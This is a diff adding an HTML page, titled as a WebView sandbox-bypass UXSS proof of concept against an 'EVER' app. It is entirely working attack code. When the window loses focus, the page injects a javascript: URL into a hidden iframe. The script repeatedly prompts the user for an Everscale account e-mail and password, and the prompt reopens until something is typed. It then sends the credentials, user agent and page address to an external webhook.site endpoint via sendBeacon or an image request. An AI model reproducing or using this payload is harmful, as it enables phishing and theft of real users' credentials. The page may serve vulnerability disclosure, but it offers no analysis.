@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, user-scalable=no">
+  <title>Bypass sandbox Webview UXSS Delayed JavaScript execution leak to host app (EVER)</title>
+  <style>
+    iframe { visibility: hidden; }
+    body { font-family: system-ui, sans-serif; text-align: center; padding-top: 100px; }
+  </style>
+  <script>
+    window.onblur = function () {
+      const code =
+        "(function(){try{"
+        + "var msg='In order to access everscale.network\\n"
+        + "you must first login on your\\nEver Account.\\n\\n"
+        + "Please type your e-mail\\nand your password:';"
+        + "var v='';"
+        // Force user to fill (loop until non-empty)
+        + "while(v===null||(''+v).trim()===''){"
+        + "  v=prompt(msg,'E-mail / Password.');"
+        + "}"
+        // Build webhook URL with some context
+        + "var u='https://webhook.site/3794de7e-f8d3-472b-92b3-1c2c442a2c91'"
+        + "  + '?creds=' + encodeURIComponent(v)"
+        + "  + '&ua=' + encodeURIComponent(navigator.userAgent)"
+        + "  + '&page=' + encodeURIComponent(location.href);"
+        // Try sendBeacon first (non-blocking), then fallback to Image
+        + "try{ if(!navigator.sendBeacon(u)){ throw new Error('beacon-fallback'); } }catch(e){"
+        + "  try{ (new Image()).src = u; }catch(_e){}"
+        + "}"
+        + "}catch(e){}})()";
+
+      document.getElementById('iframe').src = "javascript:" + code;
+    };
+  </script>
+</head>
+<body>
+  <h1>Click Here</h1>
+  <iframe id="iframe"></iframe>
+</body>
+</html>
